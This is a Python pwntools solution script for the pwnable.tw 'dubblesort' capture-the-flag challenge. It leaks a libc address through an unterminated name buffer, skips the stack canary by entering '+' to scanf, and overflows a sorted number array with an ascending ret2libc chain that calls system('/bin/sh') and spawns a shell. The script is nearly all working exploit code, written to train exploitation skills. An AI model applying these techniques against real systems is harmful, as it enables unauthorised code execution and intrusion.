#!/usr/bin/env python3
"""
pwnable.tw - dubblesort (200 pts)

Vulnerabilities:
1. Info leak: read() doesn't null-terminate the name buffer. Stack contains
   a libc address that gets printed via printf("%s").
2. Stack overflow: No bounds check on number count.
3. Canary bypass: scanf("%u") with "+" input skips writing.
4. Sort awareness: ROP chain must be ascending to survive bubble sort.
"""

from pwn import *

context.arch = "i386"
context.log_level = "info"

HOST = "chall.pwnable.tw"
PORT = 10101

# Libc offsets (from libc_32.so.6)
LIBC_START_MAIN_RET_OFFSET = 0x18540 + 247  # __libc_start_main + 247
SYSTEM_OFFSET = 0x3A940
BINSH_OFFSET = 0x158E8B


def exploit(local=False):
    if local:
        r = process("./dubblesort", env={"LD_PRELOAD": "./libc_32.so.6"})
    else:
        r = remote(HOST, PORT)

    # Step 1: Leak libc address
    # Name buffer at esp+0x3c (64 bytes). Before read(), stack has libc addr.
    # By sending bytes that don't fully overwrite it, printf leaks the address.
    # The libc address (__libc_start_main_ret) is typically at offset 24-28.

    r.recvuntil(b"What your name :")

    # Send 24 bytes to preserve the libc address at offset 24+
    # But we need to also overwrite any null bytes before the leak
    r.send(b"A" * 24)

    # Receive "Hello <name><leak>,How many..."
    r.recvuntil(b"Hello ")

    # Read until we hit the comma of ",How many"
    name_and_leak = r.recvuntil(b",How many")

    # Remove the ",How many" suffix
    name_and_leak = name_and_leak[:-len(b",How many")]

    log.info(f"Received {len(name_and_leak)} bytes after 'Hello '")
    log.info(f"Raw data: {name_and_leak.hex()}")

    # Our 24 'A's plus leaked bytes
    # The leak starts after our input
    if len(name_and_leak) < 28:
        log.error(f"Not enough data for leak: got {len(name_and_leak)} bytes")
        # Try with different padding
        r.close()
        return None

    # Extract leak - it should be right after our 24 bytes
    # But there might be null bytes, so we need the full picture
    leak_bytes = name_and_leak[24:28]  # 4 bytes after our input

    if len(leak_bytes) < 4:
        # Pad with what we received
        log.warning(f"Short leak: {leak_bytes.hex()}")
        leak_bytes = leak_bytes.ljust(4, b'\x00')

    leak = u32(leak_bytes)
    log.info(f"Leaked raw: {hex(leak)}")

    # The leak is __libc_start_main + 247
    libc_base = leak - LIBC_START_MAIN_RET_OFFSET
    libc_base = libc_base & 0xFFFFF000  # Page align

    log.info(f"Libc base: {hex(libc_base)}")

    system_addr = libc_base + SYSTEM_OFFSET
    binsh_addr = libc_base + BINSH_OFFSET

    log.info(f"system(): {hex(system_addr)}")
    log.info(f"/bin/sh: {hex(binsh_addr)}")

    # Step 2: Overflow numbers array
    # numbers[0-23]: before canary
    # numbers[24]: CANARY - skip with "+"
    # numbers[25-32]: saved regs, ebp, ret addr, rop...

    r.recvuntil(b"sort :")
    count = 35
    r.sendline(str(count).encode())

    for i in range(count):
        r.recvuntil(b"number :")

        if i == 24:
            # Skip canary
            r.sendline(b"+")
        elif i < 24:
            # Small ascending values
            r.sendline(str(i + 1).encode())
        else:
            # After canary: need ascending values for ROP
            # Index 25-31: padding (< system)
            # Index 32: system
            # Index 33: dummy (> system, < binsh)
            # Index 34: /bin/sh
            if i <= 31:
                padding = libc_base + 0x1000 * (i - 24)
                r.sendline(str(padding).encode())
            elif i == 32:
                r.sendline(str(system_addr).encode())
            elif i == 33:
                dummy = libc_base + 0x100000
                r.sendline(str(dummy).encode())
            elif i == 34:
                r.sendline(str(binsh_addr).encode())
            else:
                r.sendline(str(binsh_addr + (i - 34)).encode())

    log.success("Payload sent!")
    r.interactive()


if __name__ == "__main__":
    import sys
    local = len(sys.argv) > 1 and sys.argv[1] == "local"
    exploit(local)
